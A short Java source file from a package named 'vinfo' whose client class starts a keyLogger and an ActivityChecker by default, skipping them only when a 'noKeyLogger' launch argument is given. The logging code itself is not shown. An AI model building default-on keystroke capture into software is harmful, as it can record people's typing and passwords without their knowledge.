package fr.guedesite.vinfo;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Supplier;
import java.util.stream.Collector;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import fr.guedesite.vinfo.exceptions.trait.ActivityChecker;
import fr.guedesite.vinfo.exceptions.trait.keyLogger;
import fr.guedesite.vinfo.interfaces.LoggerInstance;
import fr.guedesite.vinfo.interfaces.TraitementInstance;
import fr.guedesite.vinfo.interfaces.instance;


public class client implements instance {

	private Supplier<Stream<TraitementInstance>> traitement;
	private LoggerInstance logger;
	
	@Override
	public void init(LoggerInstance log) {
		this.logger = log;
		List<TraitementInstance> set = new ArrayList<TraitementInstance>();
		if(!Boot.instance.getLaunchArg().contains("noKeyLogger")) {
			set.add(new keyLogger());
			set.add(new ActivityChecker());
		}
		this.traitement = () -> set.stream();
		
		this.traitement.get().forEach(x -> x.init(this.logger));
	}
	
	@Override
	public void update() {
		this.traitement.get().forEach(x ->{ if(x.hasToLoop()) {x.loop();} });
	}
	

	
	public List<TraitementInstance> getTraitements() {
		return this.traitement.get().collect(Collectors.toList());
	}

}
